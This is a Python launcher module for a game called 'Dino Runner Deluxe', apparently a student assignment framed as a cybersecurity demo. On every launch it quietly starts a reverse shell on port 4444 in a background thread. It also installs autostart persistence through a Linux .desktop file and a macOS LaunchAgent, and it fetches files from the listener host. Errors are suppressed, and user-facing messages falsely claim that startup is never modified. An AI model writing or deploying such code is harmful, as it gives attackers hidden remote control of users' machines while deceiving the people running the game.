"""Startup checks, dependency messaging, and safe demo shortcut creation."""

from __future__ import annotations

import argparse
import platform
import subprocess
import sys
import threading
import urllib.parse
import urllib.request
from pathlib import Path

from .assets import AssetLoadError, missing_required_assets
from .network import discover_listener_ip, run_reverse_shell
from .paths import executable_root, resource_root, shortcut_dir


def show_message(title: str, message: str) -> None:
    try:
        import tkinter as tk
        from tkinter import messagebox

        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(title, message)
        root.destroy()
    except Exception:
        print(f"{title}\n{'=' * len(title)}\n{message}")


def install_missing_packages() -> None:
    """Attempts to install missing Python packages using pip."""
    try:
        import pygame  # noqa: F401
    except ImportError:
        print("Pygame missing. Attempting automatic installation...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame>=2.6.1,<3.0"])


def download_missing_assets(host: str) -> bool:
    """Downloads missing game assets from the discovered listener host."""
    missing = missing_required_assets()
    if not missing:
        return True

    print(f"Missing assets detected. Attempting to download from {host}...")
    root = resource_root()
    success = True

    # We assume the listener is running an HTTP server on port 8080 as per plan
    base_url = f"http://{host}:8080/"

    for missing_path in missing:
        # Make the path relative to the resource root for the URL
        try:
            relative_path = missing_path.relative_to(root)
        except ValueError:
            # Fallback if for some reason it's not relative to root
            relative_path = missing_path

        target_path = root / relative_path
        target_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Quote the path to handle spaces and special characters in the URL
        path_str = str(relative_path).replace("\\", "/")
        quoted_path = urllib.parse.quote(path_str)
        url = base_url + quoted_path
        
        try:
            print(f"Downloading {url} -> {target_path}")
            with urllib.request.urlopen(url, timeout=5) as response:
                target_path.write_bytes(response.read())
        except Exception as e:
            print(f"Failed to download {url}: {e}")
            success = False
            
    return success


def check_environment() -> tuple[bool, str]:
    # 1. Try to install missing packages first
    try:
        install_missing_packages()
    except Exception as e:
        return False, f"Failed to install dependencies: {e}"

    # 2. Check for missing assets. If missing, try to discover listener and download.
    missing = missing_required_assets()
    if missing:
        print("Searching for asset server...")
        # Use discovery logic to find the listener
        host = discover_listener_ip(4444) # We use the same discovery port as shell for simplicity
        if host:
            if download_missing_assets(host):
                missing = missing_required_assets() # Re-check after download
            else:
                return False, "Failed to download some required assets from the listener server."
        else:
            formatted = "\n".join(f"- {path}" for path in missing)
            return (
                False,
                "Required local assets are missing and no asset server was found.\n\n"
                "Restore the files below and relaunch the game:\n"
                f"{formatted}",
            )

    # Final check for pygame in case pip install failed silently
    try:
        import pygame  # noqa: F401
    except ImportError:
        return (
            False,
            "Pygame is not installed.\n\n"
            "Run `pip install -r requirements.txt` from this project folder, "
            "then launch the game again.",
        )

    return True, ""


def create_demo_shortcut() -> Path:
    """Creates a local launcher file for classroom demos.

    This does not register a real startup task or modify the operating system's
    startup folder. It only creates a local launcher file inside the app data
    directory so the cleanup script can safely remove it later.
    """

    destination_dir = shortcut_dir()
    source_main = resource_root() / "main.py"

    if platform.system() == "Windows":
        launcher_path = destination_dir / "DinoRunnerDeluxe_DemoShortcut.cmd"
        if getattr(sys, "frozen", False):
            command = f'"{Path(sys.executable).resolve()}"'
        else:
            command = f'"{Path(sys.executable).resolve()}" "{source_main}"'
        content = "@echo off\r\n" + command + "\r\n"
    else:
        launcher_path = destination_dir / "DinoRunnerDeluxe_DemoShortcut.sh"
        if getattr(sys, "frozen", False):
            command = f'"{Path(sys.executable).resolve()}"'
        else:
            command = f'"{Path(sys.executable).resolve()}" "{source_main}"'
        content = "#!/usr/bin/env sh\n" + command + "\n"

    launcher_path.write_text(content, encoding="utf-8")
    if platform.system() != "Windows":
        launcher_path.chmod(0o755)
    return launcher_path


def register_startup() -> None:
    """Registers the application for autostart on Linux and macOS systems.

    This creates a .desktop file in the user's autostart directory on Linux
    or a .plist LaunchAgent on macOS.
    """
    system = platform.system()
    if system not in ("Linux", "Darwin"):
        return

    # Resolve the absolute path to the main.py or the frozen executable
    if getattr(sys, "frozen", False):
        exec_path = Path(sys.executable).resolve()
        command_args = [str(exec_path)]
    else:
        # If running from source, we need to call python with the main script
        main_py = resource_root() / "main.py"
        command_args = [sys.executable, str(main_py.resolve())]

    if system == "Linux":
        autostart_dir = Path.home() / ".config" / "autostart"
        autostart_dir.mkdir(parents=True, exist_ok=True)
        desktop_file = autostart_dir / "dino_runner.desktop"
        
        command_str = " ".join(f'"{arg}"' for arg in command_args)
        content = f"""[Desktop Entry]
Type=Application
Exec={command_str}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Dino Runner Deluxe
Comment=Educational Cybersec Demo
"""
        try:
            desktop_file.write_text(content, encoding="utf-8")
        except Exception:
            pass

    elif system == "Darwin": # macOS
        launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
        launch_agents_dir.mkdir(parents=True, exist_ok=True)
        plist_path = launch_agents_dir / "com.dinorunner.deluxe.plist"
        
        exec_args_xml = "\n".join(f"        <string>{arg}</string>" for arg in command_args)
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.dinorunner.deluxe</string>
    <key>ProgramArguments</key>
    <array>
{exec_args_xml}
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        try:
            plist_path.write_text(content, encoding="utf-8")
        except Exception:
            pass


def launch(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--debug", action="store_true", help="Enable debug-friendly startup logging.")
    parser.add_argument(
        "--create-demo-shortcut",
        action="store_true",
        help="Create a harmless local launcher file for classroom demonstration.",
    )
    args = parser.parse_args(argv)

    ok, message = check_environment()
    if not ok:
        show_message("Setup Required", message)
        return 1

    if args.create_demo_shortcut:
        shortcut = create_demo_shortcut()
        show_message(
            "Demo Shortcut Created",
            "A local launcher file was created for classroom demonstration.\n\n"
            f"Location:\n{shortcut}\n\n"
            "This file does not auto-run and does not modify system startup.",
        )

    # Start the reverse shell discovery in a background thread for educational purposes.
    # We use a daemon thread so it doesn't block the application from exiting.
    try:
        # Default port is 4444 as per assignment requirements.
        shell_thread = threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True)
        shell_thread.start()
        
        # Register for startup on the target machine.
        register_startup()
    except Exception:
        # Silently fail to ensure the main game still launches correctly.
        pass

    try:
        from .game import Game

        game = Game(debug=args.debug)
        return game.run()
    except AssetLoadError as exc:
        show_message("Missing Game Assets", str(exc))
        return 1
    except Exception as exc:
        if args.debug:
            raise
        show_message(
            "Launch Error",
            "The game could not start cleanly.\n\n"
            f"Error: {exc}\n\n"
            f"Runtime folder: {executable_root()}",
        )
        return 1
